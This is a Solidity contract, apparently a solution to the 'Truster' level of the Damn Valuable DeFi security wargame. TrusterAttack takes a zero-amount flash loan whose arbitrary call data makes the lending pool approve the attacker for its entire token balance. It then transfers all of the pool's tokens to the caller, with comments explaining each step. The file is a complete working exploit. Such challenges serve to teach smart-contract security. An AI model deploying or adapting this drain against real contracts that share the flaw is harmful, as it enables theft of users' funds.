// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface ITrusterLenderPool {
    function damnValuableToken() external returns(IERC20);

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}


contract TrusterAttack {
    constructor(address lenderPool) {
        // get token and available amount from lending pool
        IERC20 damnValuableToken = ITrusterLenderPool(lenderPool).damnValuableToken();
        uint256 balanceToDrain = damnValuableToken.balanceOf(lenderPool);
        
        // execute flash loan, but do not borrow anything, just let the pool approve this contract as a spender of all its tokens
        ITrusterLenderPool(lenderPool).flashLoan(0, lenderPool, address(damnValuableToken), abi.encodeWithSelector(IERC20.approve.selector, address(this), balanceToDrain));
        
        // as an approved spender, tranfer all the tokens from the pool to the attacker (msg.sender)
        damnValuableToken.transferFrom(lenderPool, msg.sender, balanceToDrain);
    }
}
